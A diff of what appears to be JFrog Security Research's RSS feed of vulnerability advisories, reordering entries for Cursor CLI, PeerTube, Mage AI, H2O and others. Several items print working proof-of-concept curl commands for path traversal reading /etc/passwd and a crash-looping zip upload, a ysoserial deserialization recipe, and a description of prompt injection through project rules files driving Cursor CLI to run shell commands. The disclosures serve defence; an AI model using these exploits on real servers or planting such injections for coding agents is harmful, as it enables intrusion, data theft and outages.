@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Sun, 12 Jul 2026 08:44:17 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 12 Jul 2026 11:41:45 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -683,46 +683,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
-            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
-
-## Component
-
-[Cursor CLI](https://github.com/cursor/cursor)
-
-## Affected versions
-
-( , 2025.09.17-25b418f)
-
-## Description
-
-Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
-
-The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
-
-
-
-## PoC
-
-No PoC is supplied for this issue
-
-## Vulnerability Mitigations
-
-No mitigations are available for this issue
-
-## References
-
-[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[DSPy sandbox escape arbitrary file read]]></title>
             <link>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</link>
             <guid>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</guid>
@@ -766,6 +726,46 @@ No mitigations are supplied for this issue
 
 
 
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
+            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
+
+## Component
+
+[Cursor CLI](https://github.com/cursor/cursor)
+
+## Affected versions
+
+( , 2025.09.17-25b418f)
+
+## Description
+
+Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
+
+The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
+
+
+
+## PoC
+
+No PoC is supplied for this issue
+
+## Vulnerability Mitigations
+
+No mitigations are available for this issue
+
+## References
+
+[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
 ]]></content:encoded>
         </item>
         <item>
@@ -2283,6 +2283,66 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PeerTube User Import Authenticated Persistent Denial of Service]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32944 Medium severity. PeerTube User Import Authenticated Persistent Denial of Service]]></description>
+            <content:encoded><![CDATA[## Summary
+An Uncaught Exception in PeerTube can lead to a persistent Denial of Service in User Import.
+
+This vulnerability allows any authenticated user to cause the server to stop functioning in a persistent manner.
+
+
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
+If the yauzl library encounters a filename that is considered illegal, [it raises an exception](https://github.com/thejoshwolfe/yauzl/blob/de292f220268473eb20aef64b0a77faa9d004d9a/index.js#L737). For example, if a filename includes “..” in one of its parts, an “invalid relative path” error is raised. PeerTube does not catch this exception, thus it crashes. Even after starting the server again, it tries to read the file and crashes again, causing a permanent denial of service until the file is deleted from the system.
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
+1. Create a file `evil.zip` in the current directory, which contains at least one zip entry with a `..` in its path
+1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
+```
+new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
+curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
+```
+If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PeerTube Arbitrary Playlist Creation via ActivityPub Protocol]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</guid>
@@ -2370,122 +2430,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
-
-
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
-1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
-1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
-1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
-
-```
-curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
-```
-The .m3u8 file will be returned.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube User Import Authenticated Persistent Denial of Service]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32944 Medium severity. PeerTube User Import Authenticated Persistent Denial of Service]]></description>
-            <content:encoded><![CDATA[## Summary
-An Uncaught Exception in PeerTube can lead to a persistent Denial of Service in User Import.
-
-This vulnerability allows any authenticated user to cause the server to stop functioning in a persistent manner.
-
-
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
-If the yauzl library encounters a filename that is considered illegal, [it raises an exception](https://github.com/thejoshwolfe/yauzl/blob/de292f220268473eb20aef64b0a77faa9d004d9a/index.js#L737). For example, if a filename includes “..” in one of its parts, an “invalid relative path” error is raised. PeerTube does not catch this exception, thus it crashes. Even after starting the server again, it tries to read the file and crashes again, causing a permanent denial of service until the file is deleted from the system.
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
-1. Create a file `evil.zip` in the current directory, which contains at least one zip entry with a `..` in its path
-1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
-```
-new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
-curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
-```
-If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
@@ -2527,6 +2471,62 @@ new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/i
 curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
 ```
 If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
+
+
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
+1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
+1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
+1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
+
+```
+curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
+```
+The .m3u8 file will be returned.
 
 
 
@@ -2930,49 +2930,6 @@ No references are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI git content request remote arbitrary file leak
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
-
-## PoC
-
-```bash
-curl -X GET
-'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Mage AI pipeline interaction request remote arbitrary file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</guid>
@@ -3001,6 +2958,49 @@ Mage AI allows remote users with the "Viewer" role to leak arbitrary files from 
 curl -X GET
 'http://localhost:6789/api/pipelines/example_pipeline/interaction/..%2F..%2F..%2
 F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
+<USER TOKEN>'
+```
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI git content request remote arbitrary file leak
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
+
+## PoC
+
+```bash
+curl -X GET
+'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
 <USER TOKEN>'
 ```
 
@@ -3105,6 +3105,57 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[H2O Model Deserialization RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/h2o-model-deserialization-rce-jfsa-2024-001035518/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/h2o-model-deserialization-rce-jfsa-2024-001035518/</guid>
+            <pubDate>Sun, 21 Jul 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-6960, HIGH, H2O Model Deserialization RCE]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+H2O deserializes ML models without filtering, potentially allowing execution of malicious code
+
+
+
+## Component
+
+[h2o-core](https://mvnrepository.com/artifact/ai.h2o/h2o-core)
+
+
+
+## Affected versions
+
+(,)
+
+## Description
+
+The H2O machine learning platform uses "Iced" classes as the primary means of moving Java Objects around the cluster. The Iced format supports inclusion of serialized Java objects. When a model is deserialized, any class is allowed to be deserialized (no class whitelist). An attacker can construct a crafted Iced model that uses Java gadgets and leads to arbitrary code execution when imported to the H2O platform.
+
+
+
+## PoC
+
+An appropriate malicious serialized object can be created with the [ysoserial](https://github.com/frohoff/ysoserial/tree/master) tool, using the `CommonsBeanutils1` payload.
+
+The serialized binary can then be embedded within an Iced model in the proper format.
+
+Loading the model using the Web UI's "Import Model" command (or an equivalent API) will trigger code execution
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Guardrails RAIL XXE]]></title>
             <link>https://research.jfrog.com/vulnerabilities/guardrails-rail-xxe-jfsa-2024-001035519/</link>
             <guid>https://research.jfrog.com/vulnerabilities/guardrails-rail-xxe-jfsa-2024-001035519/</guid>
@@ -3180,57 +3231,6 @@ No mitigations are supplied for this issue
 ## References
 
 [Vendor fix](https://github.com/guardrails-ai/guardrails/pull/922)
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[H2O Model Deserialization RCE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/h2o-model-deserialization-rce-jfsa-2024-001035518/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/h2o-model-deserialization-rce-jfsa-2024-001035518/</guid>
-            <pubDate>Sun, 21 Jul 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-6960, HIGH, H2O Model Deserialization RCE]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-H2O deserializes ML models without filtering, potentially allowing execution of malicious code
-
-
-
-## Component
-
-[h2o-core](https://mvnrepository.com/artifact/ai.h2o/h2o-core)
-
-
-
-## Affected versions
-
-(,)
-
-## Description
-
-The H2O machine learning platform uses "Iced" classes as the primary means of moving Java Objects around the cluster. The Iced format supports inclusion of serialized Java objects. When a model is deserialized, any class is allowed to be deserialized (no class whitelist). An attacker can construct a crafted Iced model that uses Java gadgets and leads to arbitrary code execution when imported to the H2O platform.
-
-
-
-## PoC
-
-An appropriate malicious serialized object can be created with the [ysoserial](https://github.com/frohoff/ysoserial/tree/master) tool, using the `CommonsBeanutils1` payload.
-
-The serialized binary can then be embedded within an Iced model in the proper format.
-
-Loading the model using the Web UI's "Import Model" command (or an equivalent API) will trigger code execution
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-No references are supplied for this issue
 
 ]]></content:encoded>
         </item>
